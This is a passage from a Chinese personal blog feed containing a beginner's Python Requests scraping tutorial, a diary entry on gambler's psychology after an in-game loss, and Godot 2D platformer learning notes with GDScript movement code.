<strong>网页结构</strong></h4><ul><li><strong>静态内容</strong>：一些信息（如文本、图像等）直接包含在网页的 HTML 代码中，访问网页时能直接看到。</li><li><strong>动态内容</strong>：有些数据则需要在网页加载后通过 JavaScript 进行请求，这部分数据不会出现在源代码中。</li></ul><h4 id="2-如何加载数据"><a href="#2-如何加载数据" class="headerlink" title="2. 如何加载数据"></a>2. <strong>如何加载数据</strong></h4><p>当用户打开网页时，浏览器会：</p><ul><li>加载 HTML 文件。</li><li>解析 HTML 中的 JavaScript 代码，执行其中的 AJAX 或 Fetch 请求，以从服务器获取更多数据。</li><li>将这些数据插入到网页中，更新页面的内容。</li></ul><h4 id="3-数据请求"><a href="#3-数据请求" class="headerlink" title="3. 数据请求"></a>3. <strong>数据请求</strong></h4><ul><li><strong>API 请求</strong>：网页通常会向特定的 URL 发送 HTTP 请求（例如 GET 或 POST），并从服务器获取 JSON 或 XML 格式的数据。这些请求可以在浏览器的开发者工具中查看。</li></ul><h4 id="4-如何抓取这种数据"><a href="#4-如何抓取这种数据" class="headerlink" title="4. 如何抓取这种数据"></a>4. <strong>如何抓取这种数据</strong></h4><p>要获取这些动态加载的数据，可以按照以下步骤操作：</p><ol><li><strong>使用开发者工具</strong>：<ul><li>在浏览器中打开目标网页，右键点击元素并选择“检查”。</li><li>切换到“网络”（Network）选项卡。</li><li>刷新页面并观察所有的网络请求，找到返回所需数据的请求（通常是以 <code>JSON</code> 格式返回的数据）。</li></ul></li><li><strong>获取请求信息</strong>：<ul><li>查看请求的 URL 和所需的头部信息（Headers）。</li><li>确认请求方法（GET 或 POST）和请求参数（如果有的话）。</li></ul></li><li><strong>编写爬虫代码</strong>：<ul><li>使用像 <code>Requests</code> 库发送相同的请求，从而获取并处理响应中的数据。</li></ul></li></ol><h2 id="AJAX-请求及原理简介"><a href="#AJAX-请求及原理简介" class="headerlink" title="AJAX 请求及原理简介"></a>AJAX 请求及原理简介</h2><p>因为我之前学过Web网站部署，所以理解前端和后端的通信原理，如果要学习python爬虫，理解网站请求的原理很重要。</p><h3 id="什么是AJAX？"><a href="#什么是AJAX？" class="headerlink" title="什么是AJAX？"></a>什么是AJAX？</h3><ul><li><strong>AJAX</strong>（Asynchronous JavaScript and XML）是一种用于在不重新加载整个页面的情况下，与服务器异步通信的技术。</li><li>它允许网页动态更新内容，提升用户体验。</li></ul><h3 id="AJAX-的工作原理"><a href="#AJAX-的工作原理" class="headerlink" title="AJAX 的工作原理"></a>AJAX 的工作原理</h3><ol><li><strong>用户操作</strong>：用户在网页上执行某个操作（例如点击按钮）。</li><li>发送请求：<ul><li>使用JavaScript创建一个AJAX请求。</li><li>选择HTTP请求方法（如GET或POST），并设置请求的URL和参数。</li></ul></li><li>后台通信：<ul><li>AJAX请求被发送到服务器，服务器处理请求并返回数据（通常为JSON、XML或HTML格式）。</li></ul></li><li>接收响应：<ul><li>页面通过JavaScript接收到服务器的响应。</li></ul></li><li>更新页面：<ul><li>根据服务器返回的数据，动态更新网页的部分内容，而无需刷新整个页面。</li></ul></li></ol><h3 id="请求类型"><a href="#请求类型" class="headerlink" title="请求类型"></a>请求类型</h3><ul><li><strong>GET</strong>：用于从服务器请求数据，参数通过URL传递。</li><li><strong>POST</strong>：用于向服务器发送数据，数据包含在请求体中，适合表单提交等操作。</li></ul><h3 id="主要优点"><a href="#主要优点" class="headerlink" title="主要优点"></a>主要优点</h3><ul><li>提升用户体验：页面不需要完全刷新。</li><li>减少带宽消耗：仅请求必要的数据。</li><li>更快的交互：实现实时更新。</li></ul><h3 id="简单示例代码"><a href="#简单示例代码" class="headerlink" title="简单示例代码"></a>简单示例代码</h3><p>以下是一个简单的AJAX请求示例，使用jQuery库：</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">$.<span class="title function_">ajax</span>({</span><br><span class="line">    <span class="attr">url</span>: <span class="string">'server-endpoint'</span>,  <span class="comment">// 服务器地址</span></span><br><span class="line">    <span class="attr">type</span>: <span class="string">'GET'</span>,              <span class="comment">// 请求方式（GET/POST）</span></span><br><span class="line">    <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">response</span>) {</span><br><span class="line">        <span class="comment">// 成功接收响应后执行的代码</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(response);</span><br><span class="line">        $(<span class="string">'#result'</span>).<span class="title function_">html</span>(response);  <span class="comment">// 更新页面内容</span></span><br><span class="line">    },</span><br><span class="line">    <span class="attr">error</span>: <span class="keyword">function</span>(<span class="params">error</span>) {</span><br><span class="line">        <span class="comment">// 处理错误</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">'请求失败:'</span>, error);</span><br><span class="line">    }</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><h2 id="Requests入门"><a href="#Requests入门" class="headerlink" title="Requests入门"></a>Requests入门</h2><p><code>Requests</code> 是一个用于发送 HTTP 请求的 Python 库，它提供了一个简单而直观的 API，方便开发者与 Web 进行交互。以下是对 <code>Requests</code> 的简单介绍，包括其特点和一些基本用法。</p><h3 id="Requests-简介"><a href="#Requests-简介" class="headerlink" title="Requests 简介"></a>Requests 简介</h3><ul><li><strong>易于使用</strong>：<code>Requests</code> 库的设计旨在简化 HTTP 请求的过程，使得用户能够以极少的代码完成复杂的请求操作。</li><li><strong>支持各种 HTTP 方法</strong>：包括 <code>GET</code>、<code>POST</code>、<code>PUT</code>、<code>DELETE</code>、<code>HEAD</code> 等。</li><li><strong>自动处理 Cookies</strong>：能够轻松管理会话中的 Cookies。</li><li><strong>支持 URL 参数和表单数据</strong>：可以很方便地将参数附加到 URL 上或通过表单提交。</li><li><strong>响应对象</strong>：提供丰富的响应对象，包括状态码、响应内容、头信息等，方便获取和解析服务器返回的信息。</li></ul><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>要使用 <code>Requests</code>，首先需要安装它。可以使用 pip 来安装：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">pip install requests</span><br></pre></td></tr></tbody></table></figure><p>在国内可能因为因为网络波动出现安装失败，可以通过切换镜像源或者临时使用镜像源来下载</p><p>推荐使用清华镜像源：<a href="https://mirrors.tuna.tsinghua.edu.cn/help/pypi/">清华镜像源网站</a></p><p>我使用临时下载</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">pip install -i https://pypi.tuna.tsinghua.edu.cn/simple requests</span><br></pre></td></tr></tbody></table></figure><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><p>以下是一些常见操作的示例：</p><h4 id="1-发送-GET-请求"><a href="#1-发送-GET-请求" class="headerlink" title="1. 发送 GET 请求"></a>1. 发送 GET 请求</h4><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">'https://api.example.com/data'</span>)</span><br><span class="line"><span class="built_in">print</span>(response.status_code)  <span class="comment"># 输出状态码</span></span><br><span class="line"><span class="built_in">print</span>(response.json())        <span class="comment"># 如果响应是 JSON 格式，可以直接解析为字典</span></span><br></pre></td></tr></tbody></table></figure><h4 id="2-发送-POST-请求"><a href="#2-发送-POST-请求" class="headerlink" title="2. 发送 POST 请求"></a>2. 发送 POST 请求</h4><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">data = {</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'John'</span>,</span><br><span class="line">    <span class="string">'age'</span>: <span class="number">30</span></span><br><span class="line">}</span><br><span class="line">response = requests.post(<span class="string">'https://api.example.com/users'</span>, json=data)</span><br><span class="line"><span class="built_in">print</span>(response.status_code)</span><br><span class="line"><span class="built_in">print</span>(response.text)  <span class="comment"># 输出响应内容</span></span><br></pre></td></tr></tbody></table></figure><h4 id="3-添加-URL-参数"><a href="#3-添加-URL-参数" class="headerlink" title="3. 添加 URL 参数"></a>3. 添加 URL 参数</h4><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">params = {<span class="string">'id'</span>: <span class="number">123</span>}</span><br><span class="line">response = requests.get(<span class="string">'https://api.example.com/users'</span>, params=params)</span><br><span class="line"><span class="built_in">print</span>(response.url)  <span class="comment"># 输出完整的请求 URL</span></span><br></pre></td></tr></tbody></table></figure><h4 id="4-处理-Cookies"><a href="#4-处理-Cookies" class="headerlink" title="4. 处理 Cookies"></a>4. 处理 Cookies</h4><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">session = requests.Session()  <span class="comment"># 创建会话对象</span></span><br><span class="line">response = session.get(<span class="string">'https://api.example.com/login'</span>)</span><br><span class="line"><span class="comment"># 系统会自动处理 Cookies</span></span><br></pre></td></tr></tbody></table></figure><h4 id="5-错误处理"><a href="#5-错误处理" class="headerlink" title="5. 错误处理"></a>5. 错误处理</h4><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.get(<span class="string">'https://api.example.com/data'</span>)</span><br><span class="line">    response.raise_for_status()  <span class="comment"># 检查响应是否成功，若不成功则引发异常</span></span><br><span class="line"><span class="keyword">except</span> requests.exceptions.HTTPError <span class="keyword">as</span> err:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"HTTP error occurred: <span class="subst">{err}</span>"</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"An error occurred: <span class="subst">{err}</span>"</span>)</span><br></pre></td></tr></tbody></table></figure><h3 id="爬取百度请求网页"><a href="#爬取百度请求网页" class="headerlink" title="爬取百度请求网页"></a>爬取百度请求网页</h3><p>使用Requests请求爬取自定义的数据，原理为正常状态下我们打开百度然后输入查询的内容，返回网页数据，在这个过程中，点击百度按钮后，浏览器发送get请求附带查询的内容，得到返回结果，在使用Requests的情况下，我们通过提前定义好url和查询内容的变量，使用方法requests.get()，进行模拟浏览器请求。</p><p>然后返回结果，分拣出我们想要的数据。</p><p>代码展示:</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#导入req lib</span></span><br><span class="line"><span class="comment">#定义Url 当然你可以使用input去更加自由的检索想要的数据</span></span><br><span class="line">url = <span class="string">"https://www.baidu.com/s?wd=阿梓"</span></span><br><span class="line"><span class="comment">#请求头 加入了设备的信息值后，能返回想要的数据，否则可能没办法获取成功</span></span><br><span class="line">headers = {</span><br><span class="line">    <span class="string">"user-agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"</span></span><br><span class="line">}</span><br><span class="line"><span class="comment">#调用req的get方法并且填写相关参数 这里是rul路径 和 headers请求头</span></span><br><span class="line">resp = requests.get(url,headers=headers)</span><br><span class="line"><span class="comment">#打印到控制台，如果需要也可以保存在本地</span></span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></tbody></table></figure><p>我每次学习代码都习惯性的会加入自己的理解，比如我认为这一段代码实际上是一个功能，为了更加方便的调用这个功能，可以将它写成一个方法，</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetch_data_from_baidu</span>(<span class="params">search_term</span>):</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    从百度获取搜索结果的 HTML 内容。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param search_term: 要搜索的关键词</span></span><br><span class="line"><span class="string">    :return: 搜索结果的 HTML 内容</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义 URL，使用提供的搜索词进行格式化</span></span><br><span class="line">    url = <span class="string">f"https://www.baidu.com/s?wd=<span class="subst">{search_term}</span>"</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 请求头</span></span><br><span class="line">    headers = {</span><br><span class="line">        <span class="string">"user-agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"</span></span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 发起 GET 请求</span></span><br><span class="line">    resp = requests.get(url, headers=headers)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 检查请求是否成功</span></span><br><span class="line">    <span class="keyword">if</span> resp.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span> resp.text  <span class="comment"># 返回 HTML 内容</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"请求失败，状态码：<span class="subst">{resp.status_code}</span>"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>  <span class="comment"># 如果请求失败返回 None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用该方法，输入想要搜索的关键词</span></span><br><span class="line"><span class="comment">#主程序执行</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    term = <span class="string">"阿梓"</span>  <span class="comment"># 或者通过 input() 获取用户输入</span></span><br><span class="line">    html_content = fetch_data_from_baidu(term)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> html_content:</span><br><span class="line">        <span class="built_in">print</span>(html_content)  <span class="comment"># 打印返回的 HTML 内容</span></span><br></pre></td></tr></tbody></table></figure><p>这样完善后，更加坚固，同时增加了报错的处理。</p><p>另外也可以将这个脚本功能写多个方法，然后通过导包就可以导入在其他脚本里调用方法了。这就是python的模块化编程，允许将功能分隔到不同的文件中便于管理和重用。</p><p>这里想到了，所以顺便提一嘴。</p><h2 id="增加参数的请求"><a href="#增加参数的请求" class="headerlink" title="增加参数的请求"></a>增加参数的请求</h2><p>上一个案例增加了headers请求头，这是为了避免一些反爬的措施，初次之外，很多时候，我们使用get请求都需要增加参数，比如搜索的结果，页数，本质上都是传递参数，返回JSON结果，在做数据分析和筛选。</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'https://api.example.com/search'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求头</span></span><br><span class="line">headers = {</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'</span>,</span><br><span class="line">    <span class="string">'Accept-Language'</span>: <span class="string">'en-US,en;q=0.9'</span>,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询参数</span></span><br><span class="line">params = {</span><br><span class="line">    <span class="string">'q'</span>: <span class="string">'Python'</span>,</span><br><span class="line">    <span class="string">'page'</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">'size'</span>: <span class="number">10</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">response = requests.get(url, headers=headers, params=params)</span><br><span class="line"></span><br><span class="line"><span class="comment">#记得关闭resp,否则容易堵塞</span></span><br><span class="line">resp.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印请求的 URL、状态码和响应内容</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"请求的 URL: <span class="subst">{response.url}</span>"</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"状态码: <span class="subst">{response.status_code}</span>"</span>)</span><br><span class="line"><span class="built_in">print</span>(response.json())</span><br></pre></td></tr></tbody></table></figure><p>这次的案例是我使用chatgpt生成的，仅作为理解使用，可以看到请求的时候增加了params和headers。</p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>赌徒的心理</title>
      <link href="/NANABLOG/2024/07/13/%E8%B5%8C%E5%BE%92%E7%9A%84%E5%BF%83%E7%90%86/"/>
      <url>/NANABLOG/2024/07/13/%E8%B5%8C%E5%BE%92%E7%9A%84%E5%BF%83%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>我自认为自己了解过这方面的知识，所以应该会有所防备，不会再陷入到赌徒的陷阱中，但我错了，这几天的经历让我深刻明白了，当深入局中的时候，就已经很难逃脱出来了，人的情绪，思维，逻辑都会逐渐崩坏，然后陷入一种。</p><p>“还没有到最后，我还没有输，还能继续”</p><p>的想法中，然后就是不断投入自己的资产，在德州扑克中，这叫做梭哈。</p><p>只不过大多数人搜哈的结果都是悲剧的，此梭哈非彼梭哈了。</p><p>真正的赌徒，梭哈必然遵循着自己的逻辑，处事风格而行，那不是盲目的，为了几率去梭哈。</p><p>这种感觉，过程很爽，失败带给人的打击更大，我这次只是在游戏中体会了一把，损失的只是这几天的心血而已，但我一想到，那些几辈子，几年的努力可能因为这一次赌徒心理的爆发，化为虚无的一瞬间，就让我颤栗不止。</p><p>在这样的打击中究竟如何爬起，想想都让人陷入到抓狂中。</p><p>这次的事情，也让我更加警惕，以后如何做事，思考。</p><p>不在陷入这种心理，累积资产，遵循一点，资产达到一定规模的时候，如果你需要消费，那些根本不用思考就花费出去的才是你这个阶段能够花费的起的，而那些消费投资需要思考的，则是你当前无法承担的，如果选择入局，必然要想好后路，或者知道你所要承担的压力。</p><p>不要脑袋一热，就去做事。</p><p>去掌控，去思考，去挣扎，去累积。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 日记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>godot开发之Live2D插件使用教程</title>
      <link href="/NANABLOG/2024/07/01/godot%E5%BC%80%E5%8F%91%E4%B9%8BLive2D%E6%8F%92%E4%BB%B6%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
      <url>/NANABLOG/2024/07/01/godot%E5%BC%80%E5%8F%91%E4%B9%8BLive2D%E6%8F%92%E4%BB%B6%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>项目地址:<a href="https://github.com/MizunagiKB/gd_cubism">gd_cubism</a></p><p>项目提供了demo，方便参考学习，在demo/addons里就是插件本体，如果需要将live2d插件应用到自己的项目中，可以将插件拷贝。</p>]]></content>
      
      
      
        <tags>
            
            <tag> godot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>godot横板移动平台游戏学习笔记</title>
      <link href="/NANABLOG/2024/07/01/godot%E6%A8%AA%E6%9D%BF%E7%A7%BB%E5%8A%A8%E5%B9%B3%E5%8F%B0%E6%B8%B8%E6%88%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/NANABLOG/2024/07/01/godot%E6%A8%AA%E6%9D%BF%E7%A7%BB%E5%8A%A8%E5%B9%B3%E5%8F%B0%E6%B8%B8%E6%88%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="2D战斗"><a href="#2D战斗" class="headerlink" title="2D战斗"></a>2D战斗</h1><h2 id="基础移动"><a href="#基础移动" class="headerlink" title="基础移动"></a>基础移动</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">extends Area2D</span><br><span class="line">@onready var icon = $Icon</span><br><span class="line"></span><br><span class="line">#移动速率</span><br><span class="line">@export var speed = 100</span><br><span class="line"></span><br><span class="line">func _ready():</span><br><span class="line">pass</span><br><span class="line"></span><br><span class="line">func _process(delta):</span><br><span class="line">var direction = Vector2.ZERO</span><br><span class="line">if Input.is_action_pressed("move_right"):</span><br><span class="line">direction.x = 1</span><br><span class="line">if Input.is_action_pressed("move_left"):</span><br><span class="line">direction.x = -1</span><br><span class="line">if Input.is_action_pressed("move_up"):</span><br><span class="line">direction.y = -1</span><br><span class="line">if Input.is_action_pressed("move_down"):</span><br><span class="line">direction.y = 1</span><br><span class="line">position += direction * delta * speed</span><br></pre></td></tr></tbody></table></figure><p>通过每帧获取当前节点二位向量位置，根据Input按键输入判断移动当当前节点位置</p><p>然后然后* delta是为了稳定帧率下的运行 *speed是为了灵活的调节移动速度</p><h2 id="重力碰撞检测和动画播放"><a href="#重力碰撞检测和动画播放" class="headerlink" title="重力碰撞检测和动画播放"></a>重力碰撞检测和动画播放</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">extends CharacterBody2D</span><br><span class="line">@onready var animation_player = $AnimationPlayer</span><br><span class="line">@onready var sprite_2d = $Sprite2D</span><br><span class="line">const GRAVITY = 2000.0</span><br><span class="line">const  WALK_SPEED = 200</span><br><span class="line">#跳跃高度</span><br><span class="line">const JUMP_FORCE = 750</span><br><span class="line">#跳跃判断</span><br><span class="line">var is_jumping = false</span><br><span class="line"></span><br><span class="line">func _physics_process(delta):</span><br><span class="line">print(velocity.y)</span><br><span class="line">#物体和墙壁发生了碰撞</span><br><span class="line">if is_on_wall():</span><br><span class="line">print("撞墙")</span><br><span class="line">#没有上下的撞墙判断 只有一个力</span><br><span class="line">if is_on_wall_only():</span><br><span class="line">print("空中撞墙撞墙")</span><br><span class="line">if velocity.y == -JUMP_FORCE:</span><br><span class="line">print("jump")</span><br><span class="line">is_jumping = false</span><br><span class="line">velocity.y += delta * GRAVITY</span><br><span class="line">if Input.is_action_pressed("move_left"):</span><br><span class="line">velocity.x = -WALK_SPEED</span><br><span class="line">sprite_2d.flip_h = true</span><br><span class="line">animation_player.play("walk")</span><br><span class="line">elif Input.is_action_pressed("move_right"):</span><br><span class="line">velocity.x =  WALK_SPEED</span><br><span class="line">sprite_2d.flip_h = false</span><br><span class="line">animation_player.play("walk")</span><br><span class="line">else:</span><br><span class="line">velocity.x = 0</span><br><span class="line">move_and_slide()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func _process(delta):</span><br><span class="line">var direction = Input.get_action_strength("move_right") - Input.get_action_strength("move_left")</span><br><span class="line">if is_jumping:</span><br><span class="line">#animation_player.play("jump")</span><br><span class="line">pass</span><br><span class="line">elif direction == 0:</span><br><span class="line">animation_player.play("idle")</span><br><span class="line"></span><br><span class="line">func _input(event):</span><br><span class="line">if event.is_action_pressed("move_up") and not is_jumping and velocity.y == 0:</span><br><span class="line">velocity.y = -JUMP_FORCE</span><br><span class="line">is_jumping = true</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>使用move_and_slide()时，会检测碰撞并且滑动，从而实现了任意位置放置后，根据重力下落，然后进行移动</p><p>播放动画则是根据不同时机的判断完成</p><h2 id="窗口尺寸问题"><a href="#窗口尺寸问题" class="headerlink" title="窗口尺寸问题"></a>窗口尺寸问题</h2><p>如果出现运行场景后，窗口的尺寸会随着放大缩小发生改变，通过修改项目设置—-窗口—–模式—–canvas_items来让他自适应</p><p>教学视频:<a href="https://www.bilibili.com/video/BV1Se411k7kS/?spm_id_from=333.337.search-card.all.click&amp;vd_source=adbd70f3395ed4825cbab1afe7aa152e">https://www.bilibili.com/video/BV1Se411k7kS/?spm_id_from=333.337.search-card.all.click&amp;vd_source=adbd70f3395ed4825cbab1afe7aa152e</a></p><h2 id="实现变速移动"><a href="#实现变速移动" class="headerlink" title="实现变速移动"></a>实现变速移动</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">extends CharacterBody2D</span><br><span class="line"></span><br><span class="line">@onready var animation_player = $AnimationPlayer</span><br><span class="line">@onready var sprite_2d = $Sprite2D</span><br><span class="line"></span><br><span class="line">const GRAVITY = 2000.0</span><br><span class="line">const WALK_SPEED = 200</span><br><span class="line">const JUMP_FORCE = 750</span><br><span class="line"></span><br><span class="line">var is_jumping = false</span><br><span class="line">var walk_acceleration = 0.0</span><br><span class="line">var walk_timer = 0.0</span><br><span class="line">const WALK_ACCELERATION_TIME = 2.0</span><br><span class="line"></span><br><span class="line">func _physics_process(delta):</span><br><span class="line">    if is_on_wall():</span><br><span class="line">        print("撞墙")</span><br><span class="line">    </span><br><span class="line">    if is_on_wall_only():</span><br><span class="line">        print("空中撞墙撞墙")</span><br><span class="line">    </span><br><span class="line">    if velocity.y == -JUMP_FORCE:</span><br><span class="line">        print("jump")</span><br><span class="line">        is_jumping = false</span><br><span class="line">    </span><br><span class="line">    velocity.y += delta * GRAVITY</span><br><span class="line">    </span><br><span class="line">    if Input.is_action_pressed("move_left"):</span><br><span class="line">        velocity.x = -WALK_SPEED</span><br><span class="line">        sprite_2d.flip_h = true</span><br><span class="line">        animation_player.play("walk")</span><br><span class="line">    elif Input.is_action_pressed("move_right"):</span><br><span class="line">        if walk_timer &gt;= WALK_ACCELERATION_TIME:</span><br><span class="line">            walk_acceleration = 2.0  # 例如：超过2秒后加倍加速度</span><br><span class="line">        else:</span><br><span class="line">            walk_acceleration = 1.0  # 正常加速度</span><br><span class="line">            </span><br><span class="line">        velocity.x = WALK_SPEED * walk_acceleration</span><br><span class="line">        sprite_2d.flip_h = false</span><br><span class="line">        animation_player.play("walk")</span><br><span class="line">    else:</span><br><span class="line">        velocity.x = 0</span><br><span class="line">        walk_acceleration = 0.0</span><br><span class="line">    </span><br><span class="line">    move_and_slide()</span><br><span class="line"></span><br><span class="line">func _process(delta):</span><br><span class="line">    var direction = Input.get_action_strength("move_right") - Input.get_action_strength("move_left")</span><br><span class="line">    </span><br><span class="line">    if is_jumping:</span><br><span class="line">        # animation_player.play("jump")</span><br><span class="line">        pass</span><br><span class="line">    elif direction == 0:</span><br><span class="line">        animation_player.play("idle")</span><br><span class="line">    </span><br><span class="line">    if Input.is_action_pressed("move_right"):</span><br><span class="line">        walk_timer += delta</span><br><span class="line">    else:</span><br><span class="line">        walk_timer = 0.0</span><br><span class="line"></span><br><span class="line">func _input(event):</span><br><span class="line">    if event.is_action_pressed("move_up") and not is_jumping and velocity.y == 0:</span><br><span class="line">        velocity.y = -JUMP_FORCE</span><br><span class="line">        is_jumping = true</span><br><span class="line">    </span><br><span class="line">    if event.is_action_pressed("Sprint"):</span><br><span class="line">        print("向右冲刺")</span><br><span class="line">        velocity.x = -600</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>通过每帧判断，然后时间到了归0</p><h2 id="LimboAI"><a href="#LimboAI" class="headerlink" title="LimboAI"></a>LimboAI</h2><p>使用这个插件来快速构建项目的状态机，状态机也可以依靠纯手写脚本构建，但是为了追求效率，目前先使用轮子，之后为了更加详细的了解状态机，会自己从头在造轮子。</p><p>使用LimboAI自带的函数可以快速创建各种状态，通过使用start 和 update 来控制状态之间的切换。</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">extends CharacterBody2D</span><br><span class="line"></span><br><span class="line">@onready var animation_player = $AnimationPlayer</span><br><span class="line">@onready var sprite_2d = $Sprite2D</span><br><span class="line">@onready var trail_timer = $TrailTimer</span><br><span class="line">@onready var label = $"../Label"</span><br><span class="line"></span><br><span class="line">#状态机</span><br><span class="line">var main_sm: LimboHSM</span><br><span class="line"></span><br><span class="line">const GRAVITY = 2000.0</span><br><span class="line">const WALK_SPEED = 200</span><br><span class="line">const JUMP_FORCE = 750</span><br><span class="line"></span><br><span class="line">var speed : int</span><br><span class="line">#当前状态</span><br><span class="line">var state : String</span><br><span class="line"></span><br><span class="line">var is_jumping = false</span><br><span class="line">var walk_acceleration = 0.0</span><br><span class="line">var walk_timer = 0.0</span><br><span class="line">const WALK_ACCELERATION_TIME = 0.5</span><br><span class="line"></span><br><span class="line">func _ready():</span><br><span class="line">initate_start_machine()</span><br><span class="line"></span><br><span class="line">func _physics_process(delta):</span><br><span class="line">label.text = "speed:" + str(speed) + "\n" + "Player状态:" + str(main_sm.get_active_state())</span><br><span class="line"></span><br><span class="line">if is_on_wall():</span><br><span class="line">print("撞墙")</span><br><span class="line">state = "落地后检测到碰撞"</span><br><span class="line"></span><br><span class="line">if is_on_wall_only():</span><br><span class="line">print("空中撞墙撞墙")</span><br><span class="line">state = "浮空下检测到碰撞"</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if velocity.y == -JUMP_FORCE:</span><br><span class="line">print("jump")</span><br><span class="line">is_jumping = false</span><br><span class="line"></span><br><span class="line">velocity.y += delta * GRAVITY</span><br><span class="line"></span><br><span class="line">if Input.is_action_pressed("move_left"):</span><br><span class="line">if walk_timer &gt;= WALK_ACCELERATION_TIME:</span><br><span class="line">walk_acceleration = 2.0  # 例如：超过2秒后加倍加速度</span><br><span class="line">else:</span><br><span class="line">walk_acceleration = 1.0  # 正常加速度</span><br><span class="line">speed = -WALK_SPEED * walk_acceleration</span><br><span class="line">velocity.x = speed</span><br><span class="line">#print(-WALK_SPEED * walk_acceleration)</span><br><span class="line">sprite_2d.flip_h = true</span><br><span class="line">animation_player.play("walk")</span><br><span class="line">elif Input.is_action_pressed("move_right"):</span><br><span class="line">if walk_timer &gt;= WALK_ACCELERATION_TIME:</span><br><span class="line">walk_acceleration = 2.0  # 例如：超过2秒后加倍加速度</span><br><span class="line">else:</span><br><span class="line">walk_acceleration = 1.0  # 正常加速度</span><br><span class="line">velocity.x = WALK_SPEED * walk_acceleration</span><br><span class="line">#print(WALK_SPEED * walk_acceleration)</span><br><span class="line">sprite_2d.flip_h = false</span><br><span class="line">animation_player.play("walk")</span><br><span class="line">else:</span><br><span class="line">velocity.x = 0</span><br><span class="line">walk_acceleration = 0.0</span><br><span class="line">move_and_slide()</span><br><span class="line"></span><br><span class="line">func _process(delta):</span><br><span class="line">var direction = Input.get_action_strength("move_right") - 